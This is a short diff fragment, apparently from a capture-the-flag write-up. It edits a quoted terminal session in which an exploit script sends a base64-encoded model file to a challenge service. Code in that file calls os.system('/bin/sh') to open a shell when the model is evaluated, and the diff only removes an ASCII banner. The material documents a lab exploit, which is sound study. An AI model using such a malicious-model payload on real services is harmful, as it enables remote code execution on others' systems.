@@ -113,14 +113,7 @@ $ python3 exploit.py LOCAL
     print("Hello from the other side! Popping a shell...")
     os.system('/bin/sh')
 [+] Starting local process '/home/ctfbox/.pyenv/shims/python3': pid 39565
-
-8""8""8                   8""""8                                      
-8  8  8 eeee eeeeeee eeee 8    " eeeee eeeee eeeee eeeee  eeeee e     
-8e 8  8 8    8  8  8 8    8e     8  88 8   8   8   8   8  8  88 8     
-88 8  8 8eee 8e 8  8 8eee 88     8   8 8e  8   8e  8eee8e 8   8 8e    
-88 8  8 88   88 8  8 88   88   e 8   8 88  8   88  88   8 8   8 88    
-88 8  8 88ee 88 8  8 88ee 88eee8 8eee8 88  8   88  88   8 8eee8 88eee 
-
+...
 Send the base64 encoded model: 
 [*] Pushing payload: UEsDBAAACAgAAAAAAAAAAAAAAAAAAAAA...
 [+] Evaluating the model ...
